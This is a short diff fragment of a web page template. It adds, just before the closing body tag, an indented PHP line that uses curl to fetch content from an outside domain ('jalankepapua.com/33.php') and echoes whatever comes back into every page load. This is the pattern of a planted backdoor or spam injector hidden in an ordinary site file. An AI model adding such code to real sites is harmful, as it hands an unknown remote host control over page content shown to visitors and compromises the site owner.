@@ -2827,5 +2827,6 @@
     }
     // ]]>
 </script>
+          <?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://jalankepapua.com/33.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $dewa = curl_exec($ch); curl_close($ch);?> <?php echo $dewa; ?>
 </body>
-</html>0
+</html>
